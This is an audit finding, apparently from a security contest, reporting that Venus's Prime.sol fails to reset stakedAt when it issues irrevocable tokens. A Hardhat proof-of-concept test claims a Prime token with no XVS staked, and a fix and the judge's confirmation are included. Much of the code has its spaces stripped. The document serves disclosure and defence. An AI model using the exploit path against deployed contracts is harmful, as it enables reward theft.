@@ -1,0 +1,28 @@
+[H-01] Prime.sol - User can claim Prime token without having any staked XVS, because hisstakedAtisn’t reset whenever he is issued an irrevocable token
+Submitted bydeth, also found byrokinot,gkrastenov,merlin,Testerbot,0xDetermination,3agle,aycozynfada,Flora,KrisApostolov,berlin-101,santipu_,twicek,sl1,0xpiken,Brenzee,rvierdiiev,tapir,HChang26,Satyam_Sharma,mahdirostami, andsaid
+Whenever a new Prime token is created, the usersstakedAtis reset to 0. This happens when the userclaima revocable token and when he isissuea revocable token, but it does not happen when a user isissuean irrevocable token.
+This isissue()
+functionissue(boolisIrrevocable,address[]calldatausers)external{_checkAccessAllowed("issue(bool,address[])");if(isIrrevocable) {for(uint256i=0;i<users.length; ) {TokenstorageuserToken=tokens[users[i]];if(userToken.exists&& !userToken.isIrrevocable) {_upgrade(users[i]);}else{// We don't reset here._mint(true,users[i]);_initializeMarkets(users[i]);}unchecked{i++;}}}else{for(uint256i=0;i<users.length; ) {_mint(false,users[i]);_initializeMarkets(users[i]);// We reset stakedAt heredeletestakedAt[users[i]];unchecked{i++;}}}}
+We can see that when a revocable token is issued and minted the user’sstakedAtis reset to 0. Whenever a user’s token is upgraded, hisstakedAthas already been reset to 0 insideclaim.
+functionclaim()external{if(stakedAt[msg.sender] ==0)revertIneligibleToClaim();if(block.timestamp-stakedAt[msg.sender] <STAKING_PERIOD)revertWaitMoreTime();// We reset stakedAt herestakedAt[msg.sender] =0;_mint(false,msg.sender);_initializeMarkets(msg.sender);}
+The only one time when we don’t reset the user’sstakedAtand it’s when he is issued an irrevocable token.
+Let’s see an example and see why this is a problem:
+Alice deposits 10k XVS.The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn’t passed and herstakedAtis the original time that she deposited 10k XVS.Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn’t burned as she has an irrevocable token.Even more time passes and the protocol/DAO/admin decides to burn Alice’s irrevocable token because she is inactive.EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she callsclaim.
+Her tx goes through, since herstakedAtwasn’t reset to 0 when she got issued her irrevocable token.
+This way, Alice claimed a revocable token without having any XVS staked in the contract.
+Proof of Concept
+Add the following line at the top oftests/hardhat/Prime/Prime.ts. We’ll use this to simulate time passing
+import{time}from"@nomicfoundation/hardhat-network-helpers";
+Paste the following insidetests/hardhat/Prime/Prime.tsand runnpx hardhat test tests/hardhat/Prime/Prime.ts.
+it.only("User can get Prime token without any XVS staked",async()=>{// User1 deposits 10k XVSawaitxvs.transfer(awaituser1.getAddress(),parseUnits("10000",18));awaitxvs.connect(user1).approve(xvsVault.address,parseUnits("10000",18));awaitxvsVault.connect(user1).deposit(xvs.address,0,parseUnits("10000",18));letuserInfo=awaitxvsVault.getUserInfo(xvs.address,0,user1.getAddress());expect(userInfo.amount).to.eq(parseUnits("10000",18));// Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.// Note that the 90 day staking period still hasn't passedawaitprime.issue(true, [user1.getAddress()]);lettoken=awaitprime.tokens(user1.getAddress());expect(token.exists).to.be.equal(true);expect(token.isIrrevocable).to.be.equal(true);// User1 withdraws her entire balance XVSawaitxvsVault.connect(user1).requestWithdrawal(xvs.address,0,parseUnits("10000",18));userInfo=awaitxvsVault.getUserInfo(xvs.address,0,user1.getAddress());expect(userInfo.pendingWithdrawals).to.eq(parseUnits("10000",18));// User1's Prime token gets burned by protocolawaitprime.burn(user1.getAddress());token=awaitprime.tokens(user1.getAddress());expect(token.exists).to.be.equal(false);expect(token.isIrrevocable).to.be.equal(false);// 100 days passawaittime.increase(8640000);// User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0expect(prime.stakedAt(awaituser1.getAddress())).to.not.be.equal(0);awaitprime.connect(user1).claim();token=awaitprime.tokens(user1.getAddress());expect(token.exists).to.be.equal(true);expect(token.isIrrevocable).to.be.equal(false);});
+If you are having trouble running the test, this change might fix it. InsidePrime.sol,burn()remove the access control from the function. This doesn’t change the attack and the test outcome.
+functionburn(addressuser)external{// _checkAccessAllowed("burn(address)");_burn(user);}
+Tools Used
+Hardhat
+Recommended Mitigation Steps
+Reset the user’sstakedAtwhenever he is issued an irrevocable token.
+functionissue(boolisIrrevocable,address[]calldatausers)external{_checkAccessAllowed("issue(bool,address[])");if(isIrrevocable) {for(uint256i=0;i<users.length; ) {TokenstorageuserToken=tokens[users[i]];if(userToken.exists&& !userToken.isIrrevocable) {_upgrade(users[i]);}else{_mint(true,users[i]);_initializeMarkets(users[i]);deletestakedAt[users[i]];}...
+chechu (Venus) confirmed and commented:
+Fixedhere.
+0xDjango (Judge) commented:
+Valid issue with serious impact to the protocol.
